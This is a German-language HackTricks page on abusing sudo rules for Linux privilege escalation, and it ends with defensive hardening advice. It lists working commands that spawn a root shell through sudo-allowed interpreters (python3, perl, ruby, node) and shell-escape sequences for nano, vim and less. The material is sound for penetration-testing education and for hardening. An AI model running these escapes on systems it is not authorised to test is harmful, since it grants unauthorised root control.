# Missbrauch von Sudo-Befehlen

{{#include ../../banners/hacktricks-training.md}}

## Von Sudo erlaubte Interpreter

Wenn `sudo -l` einem Benutzer erlaubt, einen Interpreter als root auszuführen, sollte dies als direkte code execution behandelt werden. Interpreter sind dafür ausgelegt, beliebigen Code auszuführen. Daher entspricht eine Regel, die die Ausführung von `python3`, `perl`, `ruby`, `lua`, `node` oder ähnlichen Binärdateien erlaubt, normalerweise der Ausführung von root-Befehlen, sofern die Argumente nicht streng eingeschränkt und validiert werden.

Üblicher Prüfablauf:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Weitere Beispiele für Interpreter:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Der exakte Pfad ist entscheidend. Wenn die sudo-Regel `/usr/bin/python3` erlaubt, verwenden Sie während der Validierung genau diesen Pfad:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Von Sudo erlaubte Editoren

Wenn `sudo -l` einem Benutzer erlaubt, einen interaktiven Editor als Root auszuführen, sollte dies als Angriffsfläche für die Befehlsausführung betrachtet werden, nicht als harmlose Berechtigung zum Bearbeiten von Dateien. Editoren können häufig Shell-Befehle ausführen, beliebige Dateien lesen oder schreiben oder aus dem Editor heraus externe Helfer aufrufen.

Üblicher Prüfablauf:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano-Befehlsausführung

Wenn `nano` über sudo erlaubt ist, kann die Befehlsausführung über die Editor-Oberfläche erreichbar sein:
```text
Ctrl+R
Ctrl+X
```
Geben Sie dann einen Befehl wie den folgenden an:
```bash
id
/bin/sh
```
Auf einigen Terminals müssen die Standard-Streams einer interaktiven Shell möglicherweise umgeleitet werden:
```bash
reset; /bin/sh 1>&0 2>&0
```
Die genaue Tastenkombination kann je nach nano-Version und Build-Optionen variieren, aber das Sicherheitsproblem bleibt dasselbe: Der Editor läuft als root und kann externe Befehle ausführen.

### Andere häufige Editor-Escapes

Vim-ähnliche Editoren ermöglichen die Befehlsausführung häufig über `:!`:
```text
:!/bin/sh
```
Pager wie `less` können ebenfalls Shell-Ausführung ermöglichen:
```text
!/bin/sh
```
## Defensive notes

- Vermeide es, Interpreter oder interaktive Editoren über sudo zu gewähren.
- Bevorzuge feste, dem Benutzer root gehörende Wrapper, die genau eine eng begrenzte administrative Aktion ausführen.
- Wenn ein Interpreter unvermeidbar ist, beschränke den exakten Script-Pfad und verhindere benutzerkontrollierte Argumente, beschreibbare Importe, `PYTHONPATH` und die unsichere Beibehaltung der Umgebung.
- Wenn das Bearbeiten von Dateien erforderlich ist, beschränke den exakten Dateipfad und erwäge `sudoedit` mit gepatchten sudo-Versionen und strikter Umgebungsbehandlung.
- Überprüfe `SETENV`, `env_keep`, beschreibbare Arbeitsverzeichnisse, beschreibbare Modul-/Importpfade, `NOEXEC`, `use_pty` und das Logging, betrachte sie jedoch nicht als vollständige Sandbox.
{{#include ../../banners/hacktricks-training.md}}
